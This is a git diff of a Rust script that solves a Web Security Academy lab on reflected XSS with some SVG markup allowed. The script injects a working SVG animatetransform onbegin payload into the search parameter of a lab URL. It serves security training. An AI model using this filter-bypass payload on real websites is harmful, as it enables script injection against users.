@@ -1,74 +1,47 @@
-/**************************************************************************************
-*
-* Author: Ahmed Elqalaawy (@elqal3awii)
-*
-* Date: 22/11/2023
+/***********************************************************
 *
 * Lab: Reflected XSS with some SVG markup allowed
 *
-* Steps: 1. Inject payload in the search query parameter to call the alert function
-*        2. Observe that the script has been executed
+* Hack Steps: 
+*      1. Inject payload in the search query parameter
+*      2. Observe that the alert function has been called
 *
-***************************************************************************************/
-#![allow(unused)]
-/***********
-* Imports
-***********/
+************************************************************/
 use reqwest::{
-    blocking::{Client, ClientBuilder, Response},
-    header::HeaderMap,
+    blocking::{Client, ClientBuilder},
     redirect::Policy,
 };
 use std::{
-    collections::HashMap,
     io::{self, Write},
     time::Duration,
 };
 use text_colorizer::Colorize;
 
-/******************
-* Main Function
-*******************/
+// Change this to your lab URL
+const LAB_URL: &str = "https://0ae000d80464eb9f81e8e496009d00a1.h1-web-security-academy.net";
+
 fn main() {
-    // change this to your lab URL
-    let url = "https://0a600000040119a585378f7900ff0053.web-security-academy.net";
-
-    // build the client that will be used for all subsequent requests
-    let client = build_client();
-
-    // payload to call the alert function
     let payload = "<svg><animatetransform onbegin=alert(1) attributeName=transform>";
 
-    print!(
-        "{}",
-        "❯❯ Injecting payload in the search query parameter to call the alert function.. ".white(),
-    );
-    io::stdout().flush();
+    print!("❯❯ Injecting payload in the search query parameter.. ");
+    io::stdout().flush().unwrap();
 
-    // fetch the page with the injected payload
+    let client = build_web_client();
     client
-        .get(format!("{url}?search={payload}"))
+        .get(format!("{LAB_URL}?search={payload}"))
         .send()
         .expect(&format!(
             "{}",
-            "[!] Failed to fetch the page with the injected payload".red()
+            "⦗!⦘ Failed to fetch the page with the injected payload".red()
         ));
 
     println!("{}", "OK".green());
-    println!(
-        "{} {}",
-        "🗹 The lab should be marked now as".white(),
-        "solved".green()
-    )
+    println!("🗹 The lab should be marked now as {}", "solved".green())
 }
 
-/*******************************************************************
-* Function used to build the client
-* Return a client that will be used in all subsequent requests
-********************************************************************/
-fn build_client() -> Client {
+fn build_web_client() -> Client {
     ClientBuilder::new()
-        .redirect(Policy::default())
+        .redirect(Policy::none())
         .connect_timeout(Duration::from_secs(5))
         .build()
         .unwrap()
